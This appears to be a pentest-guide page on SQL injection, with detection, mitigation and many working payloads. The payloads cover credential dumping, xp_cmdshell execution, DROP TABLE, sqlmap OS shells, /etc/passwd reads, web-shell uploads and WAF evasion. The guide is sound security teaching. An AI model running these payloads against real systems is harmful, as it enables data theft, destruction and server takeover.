% Filename: 04-web-testing/injection/sql-injection.md
% Display name: SQL Injection
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application)
% Authors: @TristanInSec

# SQL Injection

## Overview

SQL injection (SQLi) occurs when user input is concatenated into SQL queries without proper sanitization. The attacker manipulates the query structure to extract data, bypass authentication, modify records, or achieve command execution on the underlying OS. SQLi affects any application that builds SQL queries from user input — regardless of language or DBMS.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application

## Prerequisites

- Web application with a back-end database
- User-controlled input reaching SQL queries (parameters, headers, cookies, JSON fields)
- Insufficient input validation or parameterized queries

## Detection Methodology

Before exploiting, confirm the injection point and DBMS.

### Identifying Injection Points

Test every input field — not just obvious parameters. SQLi can exist in:

- URL query parameters (`?id=1`)
- POST body fields
- HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`)
- Cookie values
- JSON/XML field values
- REST API path segments (`/api/users/1`)

### Boundary Testing

Submit these characters and observe behavior changes (errors, different content, time delays):

```text
'
"
;
)
' OR '1'='1
' OR '1'='2
1 AND 1=1
1 AND 1=2
```

A difference in response between `AND 1=1` (true) and `AND 1=2` (false) confirms injection. Error messages revealing SQL syntax (e.g., `You have an error in your SQL syntax`) confirm both injection and the DBMS.

### DBMS Fingerprinting

Once injection is confirmed, identify the DBMS through version functions:

```sql
-- MySQL
SELECT @@version
SELECT version()

-- PostgreSQL
SELECT version()

-- MSSQL
SELECT @@version

-- Oracle
SELECT banner FROM v$version WHERE ROWNUM = 1

-- SQLite
SELECT sqlite_version()
```

String concatenation behavior also fingerprints the DBMS:

```sql
-- MySQL: 'ab' (space-concatenates)
SELECT 'a' 'b'

-- PostgreSQL: 'ab'
SELECT 'a' || 'b'

-- MSSQL: 'ab'
SELECT 'a' + 'b'

-- Oracle: 'ab'
SELECT 'a' || 'b' FROM dual
```

## Techniques

### Union-Based

Requires the same number of columns in the injected `UNION SELECT` as the original query. Works when results are reflected in the response.

**Step 1 — Determine column count:**

```sql
-- ORDER BY incrementing (error when exceeding column count)
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   ← error here means 2 columns

-- UNION NULL method
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -   ← no error means 3 columns
```

**Step 2 — Find reflected columns:**

```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
```

The column that displays `a` in the response is the output channel.

**Step 3 — Extract data:**

```sql
-- MySQL: list databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata-- -

-- MySQL: list tables in a database
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'-- -

-- MySQL: list columns
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -

-- MySQL: extract data
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users-- -
```

```sql
-- PostgreSQL: list tables
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -

-- MSSQL: list tables
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'-- -

-- Oracle: list tables
' UNION SELECT NULL,table_name,NULL FROM all_tables-- -

-- SQLite: list tables
' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'-- -
```

### Error-Based

Extracts data through database error messages. Useful when UNION output is not reflected but errors are displayed.

```sql
-- MySQL: extractvalue (works on MySQL 5.1+)
' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -

-- MySQL: updatexml
' AND updatexml(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -

-- MSSQL: convert error
' AND 1=CONVERT(int,(SELECT @@version))-- -

-- PostgreSQL: cast error
' AND 1=CAST((SELECT version()) AS int)-- -
```

Output appears in the error message — look for data between `~` delimiters (0x7e) or in type conversion errors.

### Blind Boolean-Based

No visible output or errors. Infer data by asking true/false questions and observing response differences (content length, specific strings, HTTP status codes).

```sql
-- Test: is the first character of the database name > 'm'?
' AND (SELECT SUBSTRING(database(),1,1))>'m'-- -

-- Binary search the first character
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>109-- -
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>97-- -

-- MySQL: check if a table exists
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='users')>0-- -
```

Boolean-based extraction is slow (one character at a time). Use sqlmap for automated extraction.

### Blind Time-Based

No response difference at all — use conditional time delays as the side channel.

```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF((SELECT SUBSTRING(database(),1,1))='a',SLEEP(5),0)-- -

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -

-- SQLite (heavy query as delay)
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -
```

A 5-second delay on the true condition confirms injection. Time-based is the slowest extraction method — use only when boolean and error methods fail.

### Second-Order SQLi

Input is stored safely, then used unsafely in a different query later. Example: register a username like `admin'-- -`, which gets stored. When the application later uses that username in an unparameterized query (e.g., password change), injection triggers.

Second-order is hard to detect with automated tools. Look for it when:
- Registration/profile fields appear in other functionality
- Stored values are used in administrative queries
- Batch processing uses previously stored user input

### Stacked Queries

Some DBMS/driver combinations allow multiple statements separated by `;`:

```sql
-- MSSQL (commonly supports stacked queries)
'; EXEC xp_cmdshell('whoami')-- -

-- PostgreSQL (supports stacked queries)
'; CREATE TABLE pwned(data text); INSERT INTO pwned VALUES('test')-- -

-- MySQL (rarely works through web apps — depends on API used)
'; DROP TABLE temp-- -
```

MySQL with PHP's `mysqli_query()` does not support stacked queries. MySQL with `mysqli_multi_query()` does. MSSQL and PostgreSQL generally support them.

## Automated Testing with sqlmap

```bash
# sqlmap
# https://sqlmap.org/
# Basic GET parameter test
sqlmap -u "http://target.com/page?id=1" --batch

# POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Specify injection point with * marker
sqlmap -u "http://target.com/page" --data="id=1*&name=test" --batch

# Cookie injection
sqlmap -u "http://target.com/page" --cookie="session=abc123*" --batch

# Specific DBMS and technique
sqlmap -u "http://target.com/page?id=1" --dbms=mysql --technique=BEU --batch

# Higher level/risk for more payloads (includes time-based, OR-based)
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch
```

Technique flags (`--technique`): `B`=Boolean, `E`=Error, `U`=Union, `S`=Stacked, `T`=Time, `Q`=Inline queries. Default is `BEUSTQ`.

### Enumeration with sqlmap

```bash
# sqlmap
# https://sqlmap.org/
# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables --batch

# Enumerate columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --columns --batch

# Dump table data
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump --batch

# Current user and database
sqlmap -u "http://target.com/page?id=1" --current-user --current-db --batch

# Password hashes
sqlmap -u "http://target.com/page?id=1" --passwords --batch

# Interactive SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell --batch

# OS shell (requires stacked queries + privileges)
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# Read server-side file
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd" --batch

# Write file to server
sqlmap -u "http://target.com/page?id=1" --file-write="./shell.php" --file-dest="/var/www/html/shell.php" --batch
```

### WAF Bypass with Tamper Scripts

```bash
# sqlmap
# https://sqlmap.org/
# Common tamper scripts for WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment --batch
sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase --batch
sqlmap -u "http://target.com/page?id=1" --tamper=charencode --batch

# Multiple tamper scripts (comma-separated)
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase --batch

# Use random user-agent + proxy
sqlmap -u "http://target.com/page?id=1" --random-agent --proxy="http://127.0.0.1:8080" --batch

# List all available tamper scripts
sqlmap --list-tampers
```

Commonly useful tamper scripts:
- `space2comment` — replaces spaces with `/**/` (bypasses basic space filters)
- `between` — replaces `>` with `NOT BETWEEN 0 AND #`
- `randomcase` — randomizes keyword casing (`SeLeCt`)
- `charencode` — URL-encodes all characters
- `apostrophemask` — replaces `'` with UTF-8 full-width equivalent

### Using sqlmap with Burp Requests

```bash
# sqlmap
# https://sqlmap.org/
# Save request from Burp (right-click > Copy to file)
sqlmap -r request.txt --batch

# Parse and test forms automatically
sqlmap -u "http://target.com/login" --forms --batch

# Crawl and test
sqlmap -u "http://target.com/" --crawl=2 --batch
```

## Manual WAF Bypass Techniques

When automated tools are detected, manual bypass techniques help evade filters.

### Space Bypass

```sql
-- Comment substitution
SELECT/**/username/**/FROM/**/users

-- Tab and newline
SELECT%09username%0aFROM%0ausers

-- Parentheses grouping (MySQL)
SELECT(username)FROM(users)
```

### Keyword Bypass

```sql
-- Case variation
SeLeCt, sElEcT

-- Inline comments (MySQL-specific)
/*!50000SELECT*/ username FROM users

-- Double keywords (if filter removes first occurrence)
SELSELECTECT
```

### Quote Bypass

```sql
-- Hex encoding (MySQL)
SELECT * FROM users WHERE name=0x61646d696e

-- CHAR() function (MySQL)
SELECT * FROM users WHERE name=CHAR(97,100,109,105,110)
```

## Detection Methods

### Network-Based Detection

- SQL error messages in HTTP responses (regex for common error patterns across DBMS)
- Unusual query parameter values containing SQL keywords (`UNION`, `SELECT`, `SLEEP`, `WAITFOR`)
- Abnormal response time patterns (consistent delays indicating time-based injection)
- High volume of similar requests with incrementing/varying payloads

### Host-Based Detection

- Database slow query logs showing injected statements
- Web application firewall (WAF) logs
- Application error logs with SQL syntax errors
- Database audit logs showing unauthorized queries or privilege escalation attempts

## Mitigation Strategies

- **Parameterized queries (prepared statements)** — the primary defense. Separates SQL code from data at the API level. Every DBMS client library supports them
- **Stored procedures** — reduce attack surface when used with parameterized inputs (stored procedures themselves can be vulnerable if they build dynamic SQL internally)
- **Input validation** — whitelist expected formats (integer, email, date). Reject unexpected characters. Not sufficient as a sole defense
- **Least privilege** — database accounts used by the application should have only the permissions needed. Never use `sa`, `root`, or `DBA` for application connections
- **WAF rules** — defense-in-depth layer. Catches common payloads but can be bypassed. Not a substitute for parameterized queries
- **Error handling** — never expose database error messages to users. Use generic error pages and log details server-side

## References

### Official Documentation

- [sqlmap - Automatic SQL Injection and Database Takeover Tool](https://sqlmap.org/)
- [sqlmap GitHub Repository](https://github.com/sqlmapproject/sqlmap)

### Pentest Guides & Research

- [PortSwigger Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP - SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
